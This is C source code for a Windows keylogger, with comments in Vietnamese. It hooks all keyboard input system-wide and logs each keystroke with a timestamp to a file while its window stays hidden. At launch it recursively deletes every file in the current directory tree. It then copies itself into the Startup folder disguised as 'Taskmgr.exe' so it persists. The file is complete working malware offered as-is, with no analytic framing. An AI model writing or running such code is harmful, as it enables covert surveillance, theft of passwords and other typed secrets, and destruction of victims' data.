#include <windows.h>
#include <strsafe.h>

//#pragma comment(linker, "/STACK:16777216")

HINSTANCE g_hInst;
HWND      g_hWnd;
HANDLE g_hFile;
HHOOK g_hHook;

BOOL WriteLog(const WCHAR* buffer) {
    SYSTEMTIME st;
    BOOL isWriteSuccess;
    WCHAR logEntry[1024];
    GetLocalTime(&st);
    wsprintfW(logEntry, L"[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        buffer);
    isWriteSuccess = WriteFile(
        g_hFile,
        logEntry,
        lstrlenW(logEntry) * sizeof(WCHAR),
        NULL,
        NULL
    );
    if (!isWriteSuccess)
    {
        CloseHandle(g_hFile);
        return FALSE;
    }
    return TRUE;
}
CONST WCHAR* GetKeyString(DWORD vkCode) {
    switch (vkCode) {
    case VK_LBUTTON: return L"Left mouse button";
    case VK_RBUTTON: return L"Right mouse button";
    case VK_CANCEL: return L"Control-break processing";
    case VK_MBUTTON: return L"Middle mouse button";
    case VK_XBUTTON1: return L"X1 mouse button";
    case VK_XBUTTON2: return L"X2 mouse button";
    case VK_BACK: return L"Backspace key";
    case VK_TAB: return L"Tab key";
    case VK_CLEAR: return L"Clear key";
    case VK_RETURN: return L"Enter key";
    case VK_SHIFT: return L"Shift key";
    case VK_CONTROL: return L"Ctrl key";
    case VK_MENU: return L"Alt key";
    case VK_PAUSE: return L"Pause key";
    case VK_CAPITAL: return L"Caps lock key";
    case VK_KANA: return L"IME Kana mode or IME Hangul mode";
    case VK_IME_ON: return L"IME On";
    case VK_JUNJA: return L"IME Junja mode";
    case VK_FINAL: return L"IME final mode";
    case VK_HANJA: return L"IME Hanja mode or IME Kanji mode";
    case VK_IME_OFF: return L"IME Off";
    case VK_ESCAPE: return L"Esc key";
    case VK_CONVERT: return L"IME convert";
    case VK_NONCONVERT: return L"IME nonconvert";
    case VK_ACCEPT: return L"IME accept";
    case VK_MODECHANGE: return L"IME mode change request";
    case VK_SPACE: return L"Spacebar key";
    case VK_PRIOR: return L"Page up key";
    case VK_NEXT: return L"Page down key";
    case VK_END: return L"End key";
    case VK_HOME: return L"Home key";
    case VK_LEFT: return L"Left arrow key";
    case VK_UP: return L"Up arrow key";
    case VK_RIGHT: return L"Right arrow key";
    case VK_DOWN: return L"Down arrow key";
    case VK_SELECT: return L"Select key";
    case VK_PRINT: return L"Print key";
    case VK_EXECUTE: return L"Execute key";
    case VK_SNAPSHOT: return L"Print screen key";
    case VK_INSERT: return L"Insert key";
    case VK_DELETE: return L"Delete key";
    case VK_HELP: return L"Help key";
    case 0x30: return L"0 key";
    case 0x31: return L"1 key";
    case 0x32: return L"2 key";
    case 0x33: return L"3 key";
    case 0x34: return L"4 key";
    case 0x35: return L"5 key";
    case 0x36: return L"6 key";
    case 0x37: return L"7 key";
    case 0x38: return L"8 key";
    case 0x39: return L"9 key";
    case 0x41: return L"A key";
    case 0x42: return L"B key";
    case 0x43: return L"C key";
    case 0x44: return L"D key";
    case 0x45: return L"E key";
    case 0x46: return L"F key";
    case 0x47: return L"G key";
    case 0x48: return L"H key";
    case 0x49: return L"I key";
    case 0x4A: return L"J key";
    case 0x4B: return L"K key";
    case 0x4C: return L"L key";
    case 0x4D: return L"M key";
    case 0x4E: return L"N key";
    case 0x4F: return L"O key";
    case 0x50: return L"P key";
    case 0x51: return L"Q key";
    case 0x52: return L"R key";
    case 0x53: return L"S key";
    case 0x54: return L"T key";
    case 0x55: return L"U key";
    case 0x56: return L"V key";
    case 0x57: return L"W key";
    case 0x58: return L"X key";
    case 0x59: return L"Y key";
    case 0x5A: return L"Z key";
    case VK_LWIN: return L"Left Windows logo key";
    case VK_RWIN: return L"Right Windows logo key";
    case VK_APPS: return L"Application key";
    case VK_SLEEP: return L"Computer Sleep key";
    case VK_NUMPAD0: return L"Numeric keypad 0 key";
    case VK_NUMPAD1: return L"Numeric keypad 1 key";
    case VK_NUMPAD2: return L"Numeric keypad 2 key";
    case VK_NUMPAD3: return L"Numeric keypad 3 key";
    case VK_NUMPAD4: return L"Numeric keypad 4 key";
    case VK_NUMPAD5: return L"Numeric keypad 5 key";
    case VK_NUMPAD6: return L"Numeric keypad 6 key";
    case VK_NUMPAD7: return L"Numeric keypad 7 key";
    case VK_NUMPAD8: return L"Numeric keypad 8 key";
    case VK_NUMPAD9: return L"Numeric keypad 9 key";
    case VK_MULTIPLY: return L"Multiply key";
    case VK_ADD: return L"Add key";
    case VK_SEPARATOR: return L"Separator key";
    case VK_SUBTRACT: return L"Subtract key";
    case VK_DECIMAL: return L"Decimal key";
    case VK_DIVIDE: return L"Divide key";
    case VK_F1: return L"F1 key";
    case VK_F2: return L"F2 key";
    case VK_F3: return L"F3 key";
    case VK_F4: return L"F4 key";
    case VK_F5: return L"F5 key";
    case VK_F6: return L"F6 key";
    case VK_F7: return L"F7 key";
    case VK_F8: return L"F8 key";
    case VK_F9: return L"F9 key";
    case VK_F10: return L"F10 key";
    case VK_F11: return L"F11 key";
    case VK_F12: return L"F12 key";
    case VK_F13: return L"F13 key";
    case VK_F14: return L"F14 key";
    case VK_F15: return L"F15 key";
    case VK_F16: return L"F16 key";
    case VK_F17: return L"F17 key";
    case VK_F18: return L"F18 key";
    case VK_F19: return L"F19 key";
    case VK_F20: return L"F20 key";
    case VK_F21: return L"F21 key";
    case VK_F22: return L"F22 key";
    case VK_F23: return L"F23 key";
    case VK_F24: return L"F24 key";
    case VK_NUMLOCK: return L"Num lock key";
    case VK_SCROLL: return L"Scroll lock key";
    case VK_LSHIFT: return L"Left Shift key";
    case VK_RSHIFT: return L"Right Shift key";
    case VK_LCONTROL: return L"Left Ctrl key";
    case VK_RCONTROL: return L"Right Ctrl key";
    case VK_LMENU: return L"Left Alt key";
    case VK_RMENU: return L"Right Alt key";
    case VK_BROWSER_BACK: return L"Browser Back key";
    case VK_BROWSER_FORWARD: return L"Browser Forward key";
    case VK_BROWSER_REFRESH: return L"Browser Refresh key";
    case VK_BROWSER_STOP: return L"Browser Stop key";
    case VK_BROWSER_SEARCH: return L"Browser Search key";
    case VK_BROWSER_FAVORITES: return L"Browser Favorites key";
    case VK_BROWSER_HOME: return L"Browser Start and Home key";
    case VK_VOLUME_MUTE: return L"Volume Mute key";
    case VK_VOLUME_DOWN: return L"Volume Down key";
    case VK_VOLUME_UP: return L"Volume Up key";
    case VK_MEDIA_NEXT_TRACK: return L"Next Track key";
    case VK_MEDIA_PREV_TRACK: return L"Previous Track key";
    case VK_MEDIA_STOP: return L"Stop Media key";
    case VK_MEDIA_PLAY_PAUSE: return L"Play/Pause Media key";
    case VK_LAUNCH_MAIL: return L"Start Mail key";
    case VK_LAUNCH_MEDIA_SELECT: return L"Select Media key";
    case VK_LAUNCH_APP1: return L"Start Application 1 key";
    case VK_LAUNCH_APP2: return L"Start Application 2 key";
    case VK_OEM_1: return L"It can vary by keyboard. For the US ANSI keyboard , the Semiсolon and Colon key";
    case VK_OEM_PLUS: return L"For any country/region, the Equals and Plus key";
    case VK_OEM_COMMA: return L"For any country/region, the Comma and Less Than key";
    case VK_OEM_MINUS: return L"For any country/region, the Dash and Underscore key";
    case VK_OEM_PERIOD: return L"For any country/region, the Period and Greater Than key";
    case VK_OEM_2: return L"It can vary by keyboard. For the US ANSI keyboard, the Forward Slash and Question Mark key";
    case VK_OEM_3: return L"It can vary by keyboard. For the US ANSI keyboard, the Grave Accent and Tilde key";
    case VK_GAMEPAD_A: return L"Gamepad A button";
    case VK_GAMEPAD_B: return L"Gamepad B button";
    case VK_GAMEPAD_X: return L"Gamepad X button";
    case VK_GAMEPAD_Y: return L"Gamepad Y button";
    case VK_GAMEPAD_RIGHT_SHOULDER: return L"Gamepad Right Shoulder button";
    case VK_GAMEPAD_LEFT_SHOULDER: return L"Gamepad Left Shoulder button";
    case VK_GAMEPAD_LEFT_TRIGGER: return L"Gamepad Left Trigger button";
    case VK_GAMEPAD_RIGHT_TRIGGER: return L"Gamepad Right Trigger button";
    case VK_GAMEPAD_DPAD_UP: return L"Gamepad D-pad Up button";
    case VK_GAMEPAD_DPAD_DOWN: return L"Gamepad D-pad Down button";
    case VK_GAMEPAD_DPAD_LEFT: return L"Gamepad D-pad Left button";
    case VK_GAMEPAD_DPAD_RIGHT: return L"Gamepad D-pad Right button";
    case VK_GAMEPAD_MENU: return L"Gamepad Menu/Start button";
    case VK_GAMEPAD_VIEW: return L"Gamepad View/Back button";
    case VK_GAMEPAD_LEFT_THUMBSTICK_BUTTON: return L"Gamepad Left Thumbstick button";
    case VK_GAMEPAD_RIGHT_THUMBSTICK_BUTTON: return L"Gamepad Right Thumbstick button";
    case VK_GAMEPAD_LEFT_THUMBSTICK_UP: return L"Gamepad Left Thumbstick up";
    case VK_GAMEPAD_LEFT_THUMBSTICK_DOWN: return L"Gamepad Left Thumbstick down";
    case VK_GAMEPAD_LEFT_THUMBSTICK_RIGHT: return L"Gamepad Left Thumbstick right";
    case VK_GAMEPAD_LEFT_THUMBSTICK_LEFT: return L"Gamepad Left Thumbstick left";
    case VK_GAMEPAD_RIGHT_THUMBSTICK_UP: return L"Gamepad Right Thumbstick up";
    case VK_GAMEPAD_RIGHT_THUMBSTICK_DOWN: return L"Gamepad Right Thumbstick down";
    case VK_GAMEPAD_RIGHT_THUMBSTICK_RIGHT: return L"Gamepad Right Thumbstick right";
    case VK_GAMEPAD_RIGHT_THUMBSTICK_LEFT: return L"Gamepad Right Thumbstick left";
    case VK_OEM_4: return L"It can vary by keyboard. For the US ANSI keyboard, the Left Brace key";
    case VK_OEM_5: return L"It can vary by keyboard. For the US ANSI keyboard, the Backslash and Pipe key";
    case VK_OEM_6: return L"It can vary by keyboard. For the US ANSI keyboard, the Right Brace key";
    case VK_OEM_7: return L"It can vary by keyboard. For the US ANSI keyboard, the Apostrophe and Double Quotation Mark key";
    case VK_OEM_8: return L"It can vary by keyboard. For the Canadian CSA keyboard, the Right Ctrl key";
    case VK_OEM_102: return L"It can vary by keyboard. For the European ISO keyboard, the Backslash and Pipe key";
    case VK_PROCESSKEY: return L"IME PROCESS key";
    case VK_PACKET: return L"Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP";
    case VK_ATTN: return L"Attn key";
    case VK_CRSEL: return L"CrSel key";
    case VK_EXSEL: return L"ExSel key";
    case VK_EREOF: return L"Erase EOF key";
    case VK_PLAY: return L"Play key";
    case VK_ZOOM: return L"Zoom key";
    case VK_PA1: return L"PA1 key";
    case VK_OEM_CLEAR: return L"Clear key";
    }
}
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        WCHAR keyString[1024];
        wcscpy_s(keyString, 1024, GetKeyString(p->vkCode));
        WriteLog(keyString);
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
VOID StartLogging() {
    g_hFile = CreateFileW(L"unname.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
}
void StopLogging() {
    UnhookWindowsHookEx(g_hHook);
    g_hHook = NULL;
    CloseHandle(g_hFile);
    g_hFile = NULL;
}
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        StartLogging();
        break;

    case WM_DESTROY:
        StopLogging();
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
    return 0;
}
VOID DAll(LPCWSTR dir) {
    WCHAR path[512];
    WCHAR dirs[512][512] = { 0 };
    int nDir = 0;
    HANDLE hFind;
    WIN32_FIND_DATAW findData;
    wcscpy_s(dirs[nDir], 512, dir);
    nDir++;
    //i current index of dirs
    for (int i = 0; i < nDir; i++) {
        // Tìm kiếm trong đường dẫn thư mục hiện tại
        wcscpy_s(path, 512, dirs[i]);
        StringCchCatW(path, 512, L"\\*");
        hFind = FindFirstFileW(
            path,
            &findData
        );
        if (hFind == INVALID_HANDLE_VALUE) {
            continue; // ??
        }
        // Lặp xoá file thêm thư mục vào đường dẫn thư mục cần xoá
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
                continue;
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // Đây là thư mục
                //Tạo đường dẫn thư mục
                wcscpy_s(path, 512, dirs[i]);
                StringCchCatW(path, 512, L"\\");
                StringCchCatW(path, 512, findData.cFileName);
                //Thêm vào dirs
                wcscpy_s(dirs[nDir++], 512, path);
            }
            else {
                // Đây là file
                // tao file
                wcscpy_s(path, 512, dirs[i]);
                StringCchCatW(path, 512, L"\\");
                StringCchCatW(path, 512, findData.cFileName);
                //xoá file
                DeleteFile(
                    path
                );
            }
        } while (FindNextFileW(hFind, &findData));
    }
}
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    DAll(L".");
    CopyFileExW(
        L"Keylogger.exe",
        L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Taskmgr.exe",
        NULL,
        NULL,
        NULL,
        COPY_FILE_FAIL_IF_EXISTS
    );
    g_hInst = hInstance;
    WNDCLASSEXW wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursorW(NULL, IDC_ARROW);
    wc.hbrBackground = NULL;
    wc.lpszClassName = L"KeyloggerClass";
    RegisterClassExW(
        &wc
    );
    g_hWnd = CreateWindowExW(
        0,
        L"KeyloggerClass",
        NULL,
        0,
        0,
        0,
        0,
        0,
        NULL,
        NULL,
        NULL,
        NULL
    );
    ShowWindow(
        g_hWnd,
        SW_HIDE
    );

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}